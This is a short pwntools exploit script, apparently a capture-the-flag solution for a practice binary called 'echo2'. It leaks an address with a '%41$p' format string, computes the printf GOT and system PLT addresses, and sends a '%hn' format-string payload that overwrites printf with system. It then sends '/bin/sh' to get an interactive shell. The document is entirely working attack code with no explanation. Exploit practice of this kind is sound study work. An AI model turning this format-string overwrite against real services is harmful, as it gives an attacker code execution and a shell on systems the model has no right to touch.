from pwn import*
context.log_level= "debug"

#p = remote('hackme.inndy.tw',7712) 
p = process('./echo2')
gdb.attach(p)


p.send("%41$p\n")
data=p.recv()
p_add=int(data,16)-0xa03
print hex(p_add)

elf = ELF('./echo2')
printf_got = p_add+elf.got['printf']
system= p_add+elf.plt['system']




add1=int(hex(system)[-4:],16)
add2=int(hex(system)[-8:-4],16)
add3=int(hex(system)[-12:-8],16)

print hex(add1)
print hex(add2)
print hex(add3)

add4=0x30000-add3
add3=add3+0x30000-add2
add2=add2+0x30000-add1
add1=add1+0x30000

print add4
print add3
print add2
print add1

payload="%"+str(add1)+"c%13$hn%"+str(add2)+"c%14$hn%"+str(add3)+"c%15$hn%"+str(add4)+"c%16$hn"
payload+=p64(printf_got)+p64(printf_got+2)+p64(printf_got+4)+p64(printf_got+6)

p.send(payload+"\n")
p.send("/bin/sh\n")
p.interactive()

